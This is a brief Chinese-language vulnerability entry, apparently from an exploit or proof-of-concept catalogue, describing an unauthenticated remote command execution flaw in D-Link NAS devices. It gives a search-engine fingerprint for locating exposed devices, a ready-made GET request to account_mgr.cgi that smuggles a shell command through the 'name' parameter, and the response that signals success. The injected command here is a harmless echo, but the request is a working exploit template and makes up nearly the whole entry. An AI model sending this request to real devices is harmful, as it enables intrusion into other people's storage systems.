# D-LinkNAS设备account_mgr.cgi-未授权RCE漏洞

D-LinkNAS ｜ 命令执行 ｜ —
- **指纹**：`app="D_Link-DNS-ShareCenter"`
- **请求**：`GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;echo+123456;%27 HTTP/1.1`
- **响应特征**：200